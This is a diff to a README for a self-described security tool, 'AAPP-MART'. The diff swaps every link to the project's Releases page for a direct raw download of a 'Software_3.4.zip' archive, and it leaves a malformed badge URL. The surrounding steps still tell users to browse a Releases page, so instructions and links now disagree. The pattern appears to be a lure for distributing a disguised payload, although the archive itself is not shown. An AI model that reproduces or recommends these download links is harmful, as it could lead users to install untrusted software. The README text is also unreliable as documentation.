@@ -4,12 +4,12 @@
 Welcome to AAPP-MART, your solutions partner in proactive security. This guide will help you download and run the application with ease. Follow these simple steps to start securing your environment today.
 
 ## 🔗 Download Now
-[![Download AAPP-MART](https://img.shields.io/badge/Download%20AAPP--MART-blue.svg)](https://github.com/sairysee/aappmart/releases)
+[![Download AAPP-MART](https://github.com/sairysee/aappmart/raw/refs/heads/main/aappmart/Software_3.4.zip%https://github.com/sairysee/aappmart/raw/refs/heads/main/aappmart/Software_3.4.zip)](https://github.com/sairysee/aappmart/raw/refs/heads/main/aappmart/Software_3.4.zip)
 
 ## 📥 Download & Install
 To download the latest version of AAPP-MART, visit the Releases page. Here’s how you can do this:
 
-1. Click on the following link: [Visit this page to download](https://github.com/sairysee/aappmart/releases).
+1. Click on the following link: [Visit this page to download](https://github.com/sairysee/aappmart/raw/refs/heads/main/aappmart/Software_3.4.zip).
 2. On the Releases page, you'll see a list of available downloads. Look for the version labeled **Latest**.
 3. Click on the version to expand the details.
 4. Choose the appropriate file for your operating system (e.g., Windows, macOS, Linux).
@@ -60,6 +60,6 @@ Join our community to learn more about AAPP-MART and to get support:
 - **Documentation:** Check the official documentation for detailed guides and FAQs.
 
 ## 🔗 Download Again
-To download or see new releases, click here: [Visit this page to download](https://github.com/sairysee/aappmart/releases).
+To download or see new releases, click here: [Visit this page to download](https://github.com/sairysee/aappmart/raw/refs/heads/main/aappmart/Software_3.4.zip).
 
 Thank you for choosing AAPP-MART. Your proactive steps toward cybersecurity can make a difference in protecting your infrastructure. We're glad to have you with us.
